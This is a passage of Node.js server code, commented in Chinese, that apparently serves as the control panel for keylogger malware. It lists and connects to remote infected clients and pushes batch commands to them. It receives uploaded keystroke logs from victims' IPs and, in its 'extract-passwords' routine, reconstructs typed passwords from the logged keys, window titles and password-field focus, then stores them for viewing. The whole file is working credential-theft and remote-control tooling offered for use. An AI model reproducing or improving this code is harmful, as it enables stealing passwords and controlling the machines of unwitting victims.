                    break;

                case 'manual_connect':
                    try {
                        const client = await clientManager.manualConnect(data.ip, data.port);
                        if (client) {
                            ws.send(JSON.stringify({ type: 'connect_result', client }));
                        } else {
                            ws.send(JSON.stringify({ 
                                type: 'connect_error', 
                                message: `无法连接到 ${data.ip}:${data.port}，请检查目标主机是否在线且端口可访问` 
                            }));
                        }
                    } catch (e) {
                        ws.send(JSON.stringify({ type: 'connect_error', message: e.message }));
                    }
                    break;

                case 'disconnect_client':
                    const client = clientManager.clients.get(data.clientId);
                    if (client) {
                        client.socket.end();
                        clientManager.clients.delete(data.clientId);
                    }
                    ws.send(JSON.stringify({ type: 'disconnected', clientId: data.clientId }));
                    break;

                case 'delete_client':
                    try {
                        await clientManager.deleteKnownClient(data.clientId);
                        ws.send(JSON.stringify({
                            type: 'delete_result',
                            success: true,
                            clientId: data.clientId
                        }));
                    } catch (e) {
                        ws.send(JSON.stringify({
                            type: 'delete_result',
                            success: false,
                            clientId: data.clientId,
                            error: e.message
                        }));
                    }
                    break;

                default:
                    ws.send(JSON.stringify({ type: 'error', message: '未知的命令类型' }));
            }
        } catch (e) {
            ws.send(JSON.stringify({ type: 'error', message: e.message }));
        }
    });

    ws.on('close', () => {
        logger.info('Web 客户端已断开');
        clientManager.removeWebClient(ws);
    });
}

// HTTP API
app.get('/api/clients', (req, res) => {
    res.json(clientManager.getAllClients());
});

app.get('/api/logs', asyncHandler(async (req, res) => {
    try {
        const allFiles = await alistClient.listFiles(alistClient.basePath);
        res.json(allFiles);
    } catch (error) {
        logger.error('获取所有日志失败', { error: error.message });
        res.status(500).json({ error: '获取日志失败' });
    }
}));

app.get('/api/clients/:clientId/logs', asyncHandler(async (req, res) => {
    const clientInfo = getClientInfoById(req.params.clientId);
    if (!clientInfo.exists) {
        return res.status(404).json({ error: '客户端不存在' });
    }
    const allFiles = await alistClient.listFiles(clientInfo.logDir);
    const clientFiles = allFiles.filter(file => file.filename.startsWith(clientInfo.ip + '_'));
    res.json(clientFiles);
}));

app.get('/api/clients/:clientId/logs/:filename', asyncHandler(async (req, res) => {
    const clientInfo = getClientInfoById(req.params.clientId);
    const filename = path.basename(req.params.filename);
    if (filename !== req.params.filename) {
        return res.status(400).json({ error: '非法文件名' });
    }
    // 对于密码提取结果文件，直接从根目录读取
    const filePath = filename.startsWith('passwords_') 
        ? `${alistClient.basePath}/${filename}` 
        : `${(clientInfo.exists ? clientInfo.logDir : alistClient.basePath)}/${filename}`;
    const content = await alistClient.readFile(filePath);
    res.json({ content });
}));

app.get('/api/clients/:clientId/logs/:filename/download', asyncHandler(async (req, res) => {
    const clientInfo = getClientInfoById(req.params.clientId);
    const filename = path.basename(req.params.filename);
    if (filename !== req.params.filename) {
        return res.status(400).json({ error: '非法文件名' });
    }
    // 对于密码提取结果文件，直接从根目录读取
    const filePath = filename.startsWith('passwords_') 
        ? `${alistClient.basePath}/${filename}` 
        : `${(clientInfo.exists ? clientInfo.logDir : alistClient.basePath)}/${filename}`;
    
    try {
        await alistClient.downloadFile(filePath, res);
    } catch (error) {
        logger.error('下载日志失败', { error: error.message, filePath });
        res.status(500).json({ error: '下载失败: ' + error.message });
    }
}));

app.get('/api/clients/:clientId/logs/:filename/raw', asyncHandler(async (req, res) => {
    const clientId = req.params.clientId;
    const filename = path.basename(req.params.filename);
    if (filename !== req.params.filename) {
        return res.status(400).send('非法文件名');
    }
    
    // 对于密码提取结果文件，直接从根目录读取
    if (filename.startsWith('passwords_')) {
        const filePath = `${alistClient.basePath}/${filename}`;
        try {
            const content = await alistClient.readFile(filePath);
            res.type('text/plain').send(content);
        } catch (error) {
            logger.error('读取密码提取文件失败', { error: error.message, filePath });
            res.status(404).send('文件不存在或读取失败');
        }
    } else {
        // 处理普通日志文件
        let clientInfo = getClientInfoById(clientId);
        
        // 尝试从 clientId 中提取 IP
        let ipMatch = clientId.match(/^(\d+\.\d+\.\d+\.\d+):\d+$/);
        if (!clientInfo.exists && ipMatch) {
            // 如果客户端不存在，尝试直接使用 IP 作为目录名
            const ip = ipMatch[1];
            const filePath = `${alistClient.basePath}/${filename}`;
            try {
                const content = await alistClient.readFile(filePath);
                res.type('text/plain').send(content);
            } catch (error) {
                logger.error('读取日志文件失败', { error: error.message, filePath, clientId });
                res.status(404).send('文件不存在或读取失败');
            }
        } else {
            // 使用正常的客户端信息
            const filePath = `${(clientInfo.exists ? clientInfo.logDir : alistClient.basePath)}/${filename}`;
            try {
                const content = await alistClient.readFile(filePath);
                res.type('text/plain').send(content);
            } catch (error) {
                logger.error('读取日志文件失败', { error: error.message, filePath, clientId });
                res.status(404).send('文件不存在或读取失败');
            }
        }
    }
}));

app.delete('/api/clients/:clientId/logs/:filename', asyncHandler(async (req, res) => {
    const clientInfo = getClientInfoById(req.params.clientId);
    const filename = path.basename(req.params.filename);
    if (filename !== req.params.filename) {
        return res.status(400).json({ error: '非法文件名' });
    }
    // 对于密码提取结果文件，直接从根目录删除
    const filePath = filename.startsWith('passwords_') 
        ? `${alistClient.basePath}/${filename}` 
        : `${(clientInfo.exists ? clientInfo.logDir : alistClient.basePath)}/${filename}`;
    
    await alistClient.deleteFile(filePath);
    logger.info(`日志文件已删除: ${filePath}`, { clientId: req.params.clientId, user: req.user || 'unknown' });
    
    res.json({ success: true, message: '文件已删除' });
}));

// 批量删除日志
app.post('/api/batch/delete-logs', asyncHandler(async (req, res) => {
    const { files } = req.body;
    if (!Array.isArray(files)) {
        return res.status(400).json({ error: 'files 必须是数组' });
    }

    // ---------- 预检阶段：确认所有文件存在 ----------
    const precheckResults = await Promise.allSettled(
        files.map(async file => {
            const { clientId, filename } = file;
            const clientInfo = getClientInfoById(clientId);
            const safeFilename = path.basename(filename);
            if (safeFilename !== filename) {
                throw new Error(`非法文件名: ${filename}`);
            }
            const filePath = filename.startsWith('passwords_') 
                ? `${alistClient.basePath}/${filename}` 
                : `${(clientInfo.exists ? clientInfo.logDir : alistClient.basePath)}/${filename}`;
            
            // 尝试获取文件信息以验证存在性
            await alistClient._request('HEAD', `/api/fs/get?path=${encodeURIComponent(filePath)}`);
            return { clientId, filename, filePath };
        })
    );

    const missingFiles = [];
    const validFiles = [];
    precheckResults.forEach((result, index) => {
        if (result.status === 'rejected') {
            missingFiles.push({ ...files[index], error: result.reason.message });
        } else {
            validFiles.push(result.value);
        }
    });

    if (missingFiles.length > 0) {
        return res.status(400).json({
            success: false,
            error: '部分文件不存在或无权限访问',
            missingFiles
        });
    }

    // ---------- 执行删除 ----------
    const results = [];
    const deleteLimit = pLimit(10);

    const deleteTasks = validFiles.map(file => deleteLimit(async () => {
        try {
            await alistClient.deleteFile(file.filePath);
            auditLogger.info(`批量删除日志文件: ${file.filePath}`, { user: req.user, action: 'batch_delete_file', clientId: file.clientId, filename: file.filename });
            logger.info(`批量删除日志文件: ${file.filePath}`, { clientId: file.clientId, filename: file.filename, user: req.user || 'unknown' });
            return { clientId: file.clientId, filename: file.filename, success: true };
        } catch (error) {
            auditLogger.error(`批量删除失败: ${file.clientId}/${file.filename}`, { user: req.user, action: 'batch_delete_failed', error: error.message });
            logger.error(`批量删除失败: ${file.clientId}/${file.filename}`, { error: error.message, user: req.user || 'unknown' });
            return { clientId: file.clientId, filename: file.filename, success: false, error: error.message };
        }
    }));

    const taskResults = await Promise.allSettled(deleteTasks);
    taskResults.forEach(result => {
        if (result.status === 'fulfilled') {
            results.push(result.value);
        } else {
            results.push({ success: false, error: result.reason.message });
        }
    });

    const successCount = results.filter(r => r.success).length;
    auditLogger.info(`批量删除完成: ${successCount}/${files.length} 个文件删除成功`, { user: req.user, action: 'batch_delete_complete', total: files.length, successCount });
    logger.info(`批量删除完成: ${successCount}/${files.length} 个文件删除成功`, { user: req.user || 'unknown' });

    res.json({
        success: true,
        total: files.length,
        successCount,
        results
    });
}));

// 批量命令
app.post('/api/batch/command', asyncHandler(async (req, res) => {
    const { clientIds, command } = req.body;
    if (!Array.isArray(clientIds) || !command) {
        return res.status(400).json({ error: 'clientIds 必须是数组，且 command 必须提供' });
    }

    auditLogger.info(`批量命令执行: ${clientIds.length} 个客户端`, { user: req.user, action: 'batch_command', command: JSON.stringify(command), clientCount: clientIds.length });
    logger.info(`批量命令执行: ${clientIds.length} 个客户端`, { command: JSON.stringify(command), user: req.user || 'unknown' });

    const sendLimit = pLimit(10);
    const results = await Promise.all(clientIds.map(clientId => sendLimit(async () => {
        const result = await clientManager.sendCommand(clientId, command);
        return { clientId, ...result };
    })));
    const successCount = results.filter(r => r.success).length;

    auditLogger.info(`批量命令完成: ${successCount}/${clientIds.length} 个客户端执行成功`, { user: req.user, action: 'batch_command_complete', total: clientIds.length, successCount });
    logger.info(`批量命令完成: ${successCount}/${clientIds.length} 个客户端执行成功`, { user: req.user || 'unknown' });

    res.json({
        success: true,
        total: clientIds.length,
        successCount,
        results
    });
}));

app.post('/api/upload/:ip', express.raw({ type: 'text/plain', limit: CONFIG.uploadSizeLimit }), asyncHandler(async (req, res) => {
    const ip = req.params.ip;
    let clientId = Array.from(clientManager.clients.keys()).find(id => id.startsWith(ip));
    if (!clientId) {
        clientId = Array.from(clientManager.knownClients.keys()).find(id => id.startsWith(ip));
    }
    const client = clientManager.clients.get(clientId);
    const logDir = client ? client.logDir : alistClient.basePath;
    const filename = `${ip}_${new Date().toISOString().slice(0, 10).replace(/-/g, '')}.log`;

    try {
        await alistClient.uploadFile(logDir, filename, req.body.toString());
        logger.info(`文件上传成功: ${filename}`, { ip, size: req.body.length });
        res.json({ success: true, message: '文件上传成功' });
    } catch (error) {
        logger.error(`文件上传失败: ${filename}`, { error: error.message, ip });
        res.status(500).json({ success: false, error: '文件上传失败: ' + error.message });
    }
}));

// 缓存提取结果（基于 LRU 淘汰策略
const extractionCache = {
    lastExtractTime: 0,
    passwords: [],
    fileMTimes: new LRUCache({
        max: 500,                // 最多缓存500个文件的修改时间
        ttl: 1000 * 60 * 60,     // 1小时过期
        updateAgeOnGet: true
    })
};
app.post('/api/extract-passwords', asyncHandler(async (req, res) => {
    try {
        // 列出所有日志文件
        const allFiles = await alistClient.listFiles(alistClient.basePath);
        const logFiles = allFiles.filter(file => file.filename.endsWith('.log'));
        
        if (logFiles.length === 0) {
            return res.json({ success: true, count: 0 });
        }

        // 检查缓存是否有效（简单策略：检查文件数量是否变化，以及最近修改时间）
        let needFullExtraction = false;
        const currentMTimes = new Map();
        for (const file of logFiles) {
            const mtime = file.uploadTime ? new Date(file.uploadTime).getTime() : Date.now();
            currentMTimes.set(file.filename, mtime);
            if (!extractionCache.fileMTimes.has(file.filename) || 
                extractionCache.fileMTimes.get(file.filename) !== mtime) {
                needFullExtraction = true;
            }
        }
        if (extractionCache.fileMTimes.size !== currentMTimes.size) {
            needFullExtraction = true;
        }
        
        // 如果不需要完全重新提取，直接返回缓存结果
        if (!needFullExtraction && extractionCache.passwords.length > 0) {
            logger.info('使用缓存的密码提取结果');
            return res.json({ success: true, count: extractionCache.passwords.length });
        }

        // 读取密码黑名单哈希（一次性加载到内存）
        let blacklistedHashes = new Set();
        try {
            const blacklistedRows = await executeWithRetry('SELECT password_hash FROM password_blacklist', []);
            blacklistedRows.forEach(row => blacklistedHashes.add(row.password_hash));
        } catch (error) {
            logger.warn('读取密码黑名单失败，继续提取密码', { error: error.message });
        }

        // 并发提取密码（限制并发数，避免过多文件同时读取）
        const extractLimit = pLimit(10); // 降低并发，减轻 Alist 压力
        const extractTasks = logFiles.map(file => extractLimit(async () => {
            try {
                const content = await alistClient.readFile(`${alistClient.basePath}/${file.filename}`);
                return extractPasswordsFromLog(content, file.filename);
            } catch (error) {
                logger.warn(`读取日志文件失败: ${file.filename}`, { error: error.message });
                return [];
            }
        }));

        const results = await Promise.allSettled(extractTasks);
        let allPasswords = [];
        results.forEach(result => {
            if (result.status === 'fulfilled') {
                allPasswords.push(...result.value);
            }
        });

        // 黑名单过滤（基于密码哈希）
        const filteredPasswords = allPasswords.filter(item => {
            const hash = hashPassword(item.password);
            return !blacklistedHashes.has(hash);
        });

        // 去重：按密码内容 + 来源文件组合去重
        const uniquePasswords = [];
        const seenSet = new Set();
        for (const item of filteredPasswords) {
            const key = `${item.file}|${item.password}`;
            if (!seenSet.has(key)) {
                seenSet.add(key);
                uniquePasswords.push(item);
            }
        }
        
        // 按时间戳排序（最新的在前）
        uniquePasswords.sort((a, b) => (b.timestamp || '').localeCompare(a.timestamp || ''));

        // 保存提取结果到本地文件
        const resultFilename = 'extracted_passwords.txt';
        const resultContent = uniquePasswords.map((item, index) => {
            return `${index + 1}. 来自: ${item.file}\n` +
                   `窗口: ${item.window || '未知'}\n` +
                   `时间: ${item.timestamp}\n` +
                   `内容: ${item.password}\n` +
                   `原始数据: ${item.rawPassword}\n`;
        }).join('\n');

        const logsDir = path.join(__dirname, 'logs');
        if (!fs.existsSync(logsDir)) {
            fs.mkdirSync(logsDir, { recursive: true });
        }
        const filePath = path.join(logsDir, resultFilename);
        await fs.promises.writeFile(filePath, resultContent);
        logger.info(`成功保存提取结果到: ${filePath}, 密码数量: ${uniquePasswords.length}`);

        // 更新缓存
        extractionCache.lastExtractTime = Date.now();
        extractionCache.passwords = uniquePasswords;
        extractionCache.fileMTimes = currentMTimes;

        res.json({
            success: true,
            count: uniquePasswords.length
        });
    } catch (error) {
        logger.error('提取密码失败', { error: error.message, stack: error.stack });
        res.status(500).json({ error: '提取密码失败' });
    }
}));

app.post('/api/blacklist', asyncHandler(async (req, res) => {
    const { password } = req.body;
    if (!password || typeof password !== 'string' || !password.trim()) {
        return res.status(400).json({ error: '密码不能为空' });
    }

    const normalizedPassword = normalizePassword(password);
    const passwordHash = hashPassword(normalizedPassword);

    await executeWithRetry(
        'INSERT IGNORE INTO password_blacklist (password_hash, password) VALUES (?, ?)',
        [passwordHash, normalizedPassword]
    );

    res.json({ success: true });
}));

app.get('/api/blacklist', asyncHandler(async (req, res) => {
    const page = Math.max(1, parseInt(req.query.page, 10) || 1);
    const limit = Math.min(100, Math.max(5, parseInt(req.query.limit, 10) || 20));
    const offset = (page - 1) * limit;

    const totalCountRows = await executeWithRetry('SELECT COUNT(*) AS total FROM password_blacklist', []);
    const total = Array.isArray(totalCountRows) && totalCountRows[0] ? totalCountRows[0].total : 0;
    const totalPages = Math.max(1, Math.ceil(total / limit));

    const rows = await executeWithRetry(
        'SELECT id, password, password_hash, created_at FROM password_blacklist ORDER BY created_at DESC LIMIT ? OFFSET ?',
        [limit, offset]
    );

    res.json({ success: true, blacklist: rows, total, page, limit, totalPages });
}));

app.delete('/api/blacklist/:id', asyncHandler(async (req, res) => {
    const id = Number(req.params.id);
    if (!Number.isInteger(id) || id <= 0) {
        return res.status(400).json({ success: false, error: '非法的黑名单 ID' });
    }

    const result = await executeWithRetry('DELETE FROM password_blacklist WHERE id = ?', [id]);
    if (result.affectedRows === 0) {
        return res.status(404).json({ success: false, error: '黑名单项不存在' });
    }

    res.json({ success: true });
}));

app.get('/api/extract-passwords/view', asyncHandler(async (req, res) => {
    try {
        const resultFilename = 'extracted_passwords.txt';
        // 使用绝对路径确保文件路径正确
        const filePath = path.join(__dirname, 'logs', resultFilename);
        
        logger.info(`尝试读取提取结果文件: ${filePath}`);
        
        if (!fs.existsSync(filePath)) {
            logger.warn(`提取结果文件不存在: ${filePath}`);
            return res.status(404).send('提取结果文件不存在');
        }
        
        const content = fs.readFileSync(filePath, 'utf8');
        logger.info(`成功读取提取结果文件，大小: ${content.length} 字节`);
        res.type('text/plain').send(content);
    } catch (error) {
        logger.error('查看提取结果失败', { error: error.message, stack: error.stack });
        res.status(500).send('查看提取结果失败');
    }
}));

// 解析包含特殊键的密码字符串


// 将原始按键序列解析为可读密码
function parsePassword(rawSequence) {
    if (!rawSequence) return '';
    const lines = rawSequence.split('\n').filter(line => line.trim() !== '');
    const result = [];
    let shiftPressed = false;
    let ctrlPressed = false;
    let altPressed = false;

    const shiftMap = {
        '1': '!', '2': '@', '3': '#', '4': '$', '5': '%',
        '6': '^', '7': '&', '8': '*', '9': '(', '0': ')',
        '-': '_', '=': '+', '[': '{', ']': '}', '\\': '|',
        ';': ':', "'": '"', ',': '<', '.': '>', '/': '?',
        '`': '~'
    };

    for (const line of lines) {
        // 处理修饰键
        if (line === '[LSHIFT]' || line === '[RSHIFT]') {
            shiftPressed = true;
            continue;
        }
        if (line === '[LSHIFT_RELEASE]' || line === '[RSHIFT_RELEASE]') {
            shiftPressed = false;
            continue;
        }
        if (line === '[LCONTROL]' || line === '[RCONTROL]') {
            ctrlPressed = true;
            continue;
        }
        if (line === '[LCONTROL_RELEASE]' || line === '[RCONTROL_RELEASE]') {
            ctrlPressed = false;
            continue;
        }
        if (line === '[LALT]' || line === '[RALT]') {
            altPressed = true;
            continue;
        }
        if (line === '[LALT_RELEASE]' || line === '[RALT_RELEASE]') {
            altPressed = false;
            continue;
        }

        // 忽略单独的控制键（如 [ENTER]、[TAB] 等，这些在序列收集中已经作为分隔符）
        if (line.startsWith('[') && line.endsWith(']')) {
            // 对于退格键，删除最后一个字符
            if (line === '[BACKSPACE]' || line === '[BACK]') {
                result.pop();
            }
            // 其他控制键忽略（不加入密码）
            continue;
        }

        // 处理普通字符
        let char = line;
        if (line.length === 1) {
            if (shiftPressed) {
                char = shiftMap[line] || line.toUpperCase();
            } else {
                char = line.toLowerCase();
            }
        }
        // Ctrl 组合键通常不产生可打印字符，忽略
        if (ctrlPressed || altPressed) {
            continue;
        }
        result.push(char);
    }
    return result.join('');
}

// 从日志内容中提取密码。分离用户名与密码
// 从日志内容中提取密码（增强版，支持焦点切换、Tab切换、回车提交）
// 新增辅助函数：从原始序列解析密码（修复修饰键状态重置问题）
function parsePasswordFromSequence(sequence, initialShift, initialCtrl, initialAlt) {
    let shift = initialShift;
    let ctrl = initialCtrl;
    let alt = initialAlt;
    const result = [];
    const shiftMap = {
        '1': '!', '2': '@', '3': '#', '4': '$', '5': '%',
        '6': '^', '7': '&', '8': '*', '9': '(', '0': ')',
        '-': '_', '=': '+', '[': '{', ']': '}', '\\': '|',
        ';': ':', "'": '"', ',': '<', '.': '>', '/': '?',
        '`': '~'
    };

    for (const item of sequence) {
        if (item === '[LSHIFT]' || item === '[RSHIFT]') {
            shift = true;
            continue;
        }
        if (item === '[LSHIFT_RELEASE]' || item === '[RSHIFT_RELEASE]') {
            shift = false;
            continue;
        }
        if (item === '[LCONTROL]' || item === '[RCONTROL]') {
            ctrl = true;
            continue;
        }
        if (item === '[LCONTROL_RELEASE]' || item === '[RCONTROL_RELEASE]') {
            ctrl = false;
            continue;
        }
        if (item === '[LALT]' || item === '[RALT]') {
            alt = true;
            continue;
        }
        if (item === '[LALT_RELEASE]' || item === '[RALT_RELEASE]') {
            alt = false;
            continue;
        }
        if (item.startsWith('[') && item.endsWith(']')) continue; // 其他控制键忽略
        
        if (ctrl || alt) continue; // Ctrl/Alt 组合不产生可打印字符
        
        let char = item;
        if (item.length === 1) {
            if (shift) {
                char = shiftMap[item] || item.toUpperCase();
            } else {
                char = item.toLowerCase();
            }
        }
        result.push(char);
    }
    return result.join('');
}

function extractPasswordsFromLog(content, filename) {
    const passwords = [];
    const lines = content.split('\n');
    
    let currentWindow = '';
    let timestamp = null;
    let inPasswordField = false;
    let rawSequence = [];
    let shiftPressed = false;
    let ctrlPressed = false;
    let altPressed = false;

    const saveCurrentPassword = () => {
        if (inPasswordField && rawSequence.length > 0) {
            const rawPwd = rawSequence.join('\n');
            const parsed = parsePasswordFromSequence(rawSequence, shiftPressed, ctrlPressed, altPressed);
            if (parsed && parsed.length >= 1) {
                passwords.push({
                    file: filename,
                    timestamp: timestamp || '未知',
                    password: parsed,
                    rawPassword: rawPwd,
                    window: currentWindow || '未知窗口'
                });
            }
            rawSequence = [];
        }
        // 重置修饰键状态
        shiftPressed = false;
        ctrlPressed = false;
        altPressed = false;
    };

    for (let i = 0; i < lines.length; i++) {
        const line = lines[i].trim();
        
        // 窗口切换行：重置所有状态
        if (line.startsWith('[Window:')) {
            saveCurrentPassword();
            inPasswordField = false;
            rawSequence = [];
            shiftPressed = false;
            ctrlPressed = false;
            altPressed = false;
            
            const tsMatch = line.match(/at (\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}\+\d{4})/);
            if (tsMatch) timestamp = tsMatch[1];
            const winMatch = line.match(/\[Window:\s*(.+?)\s*at/);
            if (winMatch) currentWindow = winMatch[1];
            continue;
        }
        
        // 处理修饰键按下/释放
        if (line === '[LSHIFT]' || line === '[RSHIFT]') {
            shiftPressed = true;
            continue;
        }
        if (line === '[LSHIFT_RELEASE]' || line === '[RSHIFT_RELEASE]') {
            shiftPressed = false;
            continue;
        }
        if (line === '[LCONTROL]' || line === '[RCONTROL]') {
            ctrlPressed = true;
            continue;
        }
        if (line === '[LCONTROL_RELEASE]' || line === '[RCONTROL_RELEASE]') {
            ctrlPressed = false;
            continue;
        }
        if (line === '[LALT]' || line === '[RALT]') {
            altPressed = true;
            continue;
        }
        if (line === '[LALT_RELEASE]' || line === '[RALT_RELEASE]') {
            altPressed = false;
            continue;
        }

        // 焦点切换标记（如果存在）
        if (line.startsWith('[Focus:')) {
            const focusLower = line.toLowerCase();
            if (focusLower.includes('password') || focusLower.includes('密码')) {
                saveCurrentPassword();
                inPasswordField = true;
                rawSequence = [];
            } else if (focusLower.includes('username') || focusLower.includes('用户名')) {
                saveCurrentPassword();
                inPasswordField = false;
            } else {
                saveCurrentPassword();
                inPasswordField = false;
            }
            continue;
        }

        // TAB 键：切换输入框
        if (line.includes('[TAB]')) {
            if (inPasswordField) {
                saveCurrentPassword();
                inPasswordField = false;
            } else {
                // 假设从用户名切换到密码框
                inPasswordField = true;
                rawSequence = [];
            }
            continue;
        }

        // ENTER 键：提交表单
        if (line.includes('[ENTER]') || line.includes('[RETURN]')) {
            saveCurrentPassword();
            inPasswordField = false;
            continue;
        }

        // 退格键处理：删除最后一个原始输入
        if (line === '[BACKSPACE]' || line === '[BACK]') {
            if (inPasswordField) rawSequence.pop();
            continue;
        }

        // 如果当前在密码输入框中，收集普通按键（非空行）
        if (inPasswordField && line && !line.startsWith('[')) {
            rawSequence.push(line);
        }
    }
    
    // 处理文件末尾残留
    saveCurrentPassword();
    return passwords;
}
// 统一错误处理中间件
app.use((err, req, res, next) => {
    logger.error('API 错误', { url: req.url, error: err.message, stack: err.stack });
    res.status(err.status || 500).json({
        error: err.message || '服务器内部错误',
        ...(process.env.NODE_ENV === 'development' && { stack: err.stack })
    });
});

// 关机
let shuttingDown = false;

process.on('SIGTERM', shutdown);
process.on('SIGINT', shutdown);

async function shutdown() {
    if (shuttingDown) {
        return;
    }
    shuttingDown = true;
    logger.info('开始关机...');
    clearInterval(clientManager.heartbeatTimer);

    if (clientManager.tcpServer) {
        clientManager.tcpServer.close();
    }
    wss.clients.forEach(ws => ws.terminate());
    server.close(async () => {
        logger.info('HTTP 服务器已关闭');
        await pool.end();
        logger.info('数据库连接池已关闭');
        process.exit(0);
    });
}

// 启动服务
(async () => {
    try {
        await clientManager.init();
        
        const httpsEnabled = process.env.HTTPS_ENABLED === 'true';
        let serverInstance = server;
        let protocol = 'http';
        let port = CONFIG.httpPort;
        
        if (httpsEnabled) {
            const keyPath = process.env.HTTPS_KEY_PATH
            const certPath = process.env.HTTPS_CERT_PATH
            
            // 如果证书不存在，尝试生成自签名证书
            if (!fs.existsSync(keyPath) || !fs.existsSync(certPath)) {
                generateSelfSignedCert();
            }
            
            if (fs.existsSync(keyPath) && fs.existsSync(certPath)) {
                const key = fs.readFileSync(keyPath);
                const cert = fs.readFileSync(certPath);
                const credentials = { key, cert };
                serverInstance = https.createServer(credentials, app);
                protocol = 'https';
                logger.info('HTTPS 模式已启用');
            } else {
                logger.warn('HTTPS 证书文件不存在，将使用 HTTP 模式');
                logger.warn(`请将证书文件放置在 ${keyPath} 和 ${certPath}`);
            }
        }
        
        // 重新创建 WebSocket 服务器以使用 HTTPS 服务器
        wss = new WebSocket.Server({ server: serverInstance });
        wss.on('connection', handleWebSocketConnection);
        
        serverInstance.listen(port, () => {
            logger.info(`${protocol.toUpperCase()} 服务运行在端口 ${port}`);
            const url = `${protocol}://localhost:${port}/login.html`;
            logger.info(`访问 ${url} 打开管理界面`);
        });
    } catch (err) {
        logger.error('服务启动失败', { error: err.message, stack: err.stack });
        process.exit(1);
    }
})();